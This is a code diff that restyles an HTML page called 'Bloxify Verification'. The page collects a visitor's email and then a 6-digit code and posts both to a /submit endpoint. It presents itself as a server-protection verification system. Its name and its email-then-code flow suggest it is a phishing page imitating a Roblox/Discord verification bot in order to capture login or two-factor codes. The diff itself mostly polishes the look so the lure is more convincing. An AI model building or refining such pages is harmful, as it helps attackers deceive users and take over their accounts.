@@ -5,109 +5,135 @@
 <title>Bloxify Verification</title>
 
 <style>
+:root {
+    --bg-dark: #050505;
+    --bg-mid: #0d0d0d;
+    --glass: rgba(255,255,255,0.06);
+}
+
+* {
+    box-sizing: border-box;
+}
+
 html, body {
     margin: 0;
     width: 100%;
     height: 100%;
-    overflow: hidden;
     background: black;
-    font-family: Arial, sans-serif;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+    overflow: hidden;
     color: white;
 }
 
-/* ===== SPACE FLOW BACKGROUND ===== */
+/* ===== DEEP SPACE FLOW ===== */
 #space {
     position: fixed;
-    inset: -50%;
+    inset: -60%;
     background:
-        radial-gradient(circle at 30% 30%, #222 0%, transparent 40%),
-        radial-gradient(circle at 70% 60%, #1a1a1a 0%, transparent 45%),
-        linear-gradient(120deg, #000, #111, #000);
-    animation: wave 28s ease-in-out infinite alternate;
+        radial-gradient(circle at 20% 30%, #1a1a1a 0%, transparent 40%),
+        radial-gradient(circle at 80% 70%, #111 0%, transparent 45%),
+        linear-gradient(120deg, #000, #080808, #000);
+    animation: spaceDrift 40s ease-in-out infinite alternate;
     z-index: 0;
 }
 
-@keyframes wave {
-    0% { transform: translate(0,0) scale(1); }
-    100% { transform: translate(-5%,-7%) scale(1.1); }
+@keyframes spaceDrift {
+    from { transform: translate(0,0) scale(1); }
+    to   { transform: translate(-6%, -8%) scale(1.15); }
 }
 
 /* ===== STARS ===== */
 .star {
     position: absolute;
-    width: 7px;
-    height: 7px;
+    width: 5px;
+    height: 5px;
     background: white;
     border-radius: 50%;
-    box-shadow: 0 0 12px white;
+    box-shadow: 0 0 12px rgba(255,255,255,.9);
+    opacity: .9;
     cursor: pointer;
     z-index: 1;
 }
 
-/* ===== CENTER ALIGN ===== */
+/* ===== CENTER LAYOUT ===== */
 #center {
     position: fixed;
     inset: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: grid;
+    place-items: center;
     z-index: 5;
 }
 
-/* ===== UI BOX ===== */
+/* ===== GLASS UI ===== */
 #ui {
     width: 420px;
-    padding: 36px;
-    background: linear-gradient(145deg, #050505, #0e0e0e);
-    border-radius: 18px;
-    text-align: center;
+    padding: 40px;
+    border-radius: 20px;
+    background:
+        linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.02)),
+        var(--bg-mid);
+    backdrop-filter: blur(14px);
     box-shadow:
-        0 0 35px rgba(255,255,255,0.15),
-        inset 0 0 20px rgba(255,255,255,0.05);
-    animation: float 6s ease-in-out infinite;
+        0 40px 80px rgba(0,0,0,.7),
+        inset 0 0 30px rgba(255,255,255,.04);
+    text-align: center;
+    animation: uiFloat 7s ease-in-out infinite;
 }
 
-@keyframes float {
-    50% { transform: translateY(-12px); }
+@keyframes uiFloat {
+    50% { transform: translateY(-10px); }
 }
 
 h1 {
     margin: 0;
-    font-size: 32px;
-    letter-spacing: 1px;
+    font-size: 34px;
+    letter-spacing: .5px;
 }
 
 p {
-    margin: 10px 0 24px;
-    color: #aaa;
+    margin: 12px 0 28px;
     font-size: 14px;
+    color: #aaa;
+    line-height: 1.5;
 }
 
+/* ===== INPUTS ===== */
 input {
     width: 100%;
-    padding: 14px;
-    background: #111;
+    padding: 14px 16px;
+    border-radius: 12px;
     border: none;
-    border-radius: 10px;
+    background: #0c0c0c;
     color: white;
-    font-size: 16px;
+    font-size: 15px;
     outline: none;
+    box-shadow: inset 0 0 0 1px rgba(255,255,255,.05);
 }
 
 button {
+    margin-top: 16px;
     width: 100%;
-    margin-top: 14px;
     padding: 14px;
-    background: #1a1a1a;
+    border-radius: 12px;
     border: none;
-    border-radius: 10px;
+    background: linear-gradient(180deg, #1c1c1c, #101010);
     color: white;
-    font-size: 16px;
+    font-size: 15px;
     cursor: pointer;
 }
 
 button:hover {
-    background: #222;
+    background: linear-gradient(180deg, #222, #141414);
+}
+
+/* STEP FADE */
+.step {
+    animation: fade .4s ease;
+}
+
+@keyframes fade {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
 }
 </style>
 </head>
@@ -119,15 +145,16 @@ button:hover {
 <div id="center">
     <div id="ui">
         <h1>Bloxify</h1>
-        <p>Bloxify new-ish verification system ready to protect your servers!</p>
+        <p>Bloxify new-ish verification system ready to protect your servers.</p>
 
-        <div id="emailStep">
+        <div id="emailStep" class="step">
             <input id="email" placeholder="Enter your email">
             <button onclick="sendEmail()">Continue</button>
         </div>
 
-        <div id="codeStep" style="display:none;">
-            <input id="code" placeholder="6-digit code" maxlength="6"
+        <div id="codeStep" class="step" style="display:none;">
+            <input id="code" placeholder="6-digit code"
+                   maxlength="6"
                    inputmode="numeric"
                    oninput="this.value=this.value.replace(/[^0-9]/g,'')">
             <button onclick="sendCode()">Verify</button>
@@ -136,44 +163,53 @@ button:hover {
 </div>
 
 <script>
-/* ===== STARS FLOAT + CLICK FLING ===== */
-for (let i = 0; i < 90; i++) {
+/* ===== STARS (SMOOTH FLOAT) ===== */
+const stars = [];
+const STAR_COUNT = 100;
+
+for (let i = 0; i < STAR_COUNT; i++) {
     const s = document.createElement("div");
     s.className = "star";
-    s.style.left = Math.random()*innerWidth + "px";
-    s.style.top = Math.random()*innerHeight + "px";
+    s.x = Math.random() * innerWidth;
+    s.y = Math.random() * innerHeight;
+    s.vx = (Math.random() - .5) * .15;
+    s.vy = (Math.random() - .5) * .15;
 
-    let vx = (Math.random()-0.5)*0.3;
-    let vy = (Math.random()-0.5)*0.3;
-
-    function move() {
-        let x = parseFloat(s.style.left) + vx;
-        let y = parseFloat(s.style.top) + vy;
-        if (x < 0 || x > innerWidth) vx *= -1;
-        if (y < 0 || y > innerHeight) vy *= -1;
-        s.style.left = x + "px";
-        s.style.top = y + "px";
-        requestAnimationFrame(move);
-    }
-    move();
+    document.body.appendChild(s);
+    stars.push(s);
 
     s.onclick = () => {
         s.animate([
             { transform: "translate(0,0)", opacity: 1 },
-            { transform: `translate(${(Math.random()-0.5)*700}px, ${(Math.random()-0.5)*700}px)`, opacity: 0 }
+            { transform: `translate(${(Math.random()-0.5)*800}px, ${(Math.random()-0.5)*800}px)`, opacity: 0 }
         ], { duration: 700 });
 
         setTimeout(() => {
-            s.style.left = Math.random()*innerWidth + "px";
-            s.style.top = Math.random()*innerHeight + "px";
+            s.x = Math.random()*innerWidth;
+            s.y = Math.random()*innerHeight;
             s.style.opacity = 1;
         }, 700);
     };
-
-    document.body.appendChild(s);
 }
 
-/* ===== EMAIL STEP ===== */
+function animateStars() {
+    for (const s of stars) {
+        s.x += s.vx;
+        s.y += s.vy;
+
+        if (s.x < 0) s.x = innerWidth;
+        if (s.x > innerWidth) s.x = 0;
+        if (s.y < 0) s.y = innerHeight;
+        if (s.y > innerHeight) s.y = 0;
+
+        s.style.left = s.x + "px";
+        s.style.top = s.y + "px";
+    }
+    requestAnimationFrame(animateStars);
+}
+animateStars();
+
+/* ===== SUBMIT ===== */
 function sendEmail() {
     fetch("/submit", {
         method: "POST",
@@ -181,11 +217,10 @@ function sendEmail() {
         body: JSON.stringify({ email: email.value })
     });
 
-    document.getElementById("emailStep").style.display = "none";
-    document.getElementById("codeStep").style.display = "block";
+    emailStep.style.display = "none";
+    codeStep.style.display = "block";
 }
 
-/* ===== CODE STEP ===== */
 function sendCode() {
     fetch("/submit", {
         method: "POST",
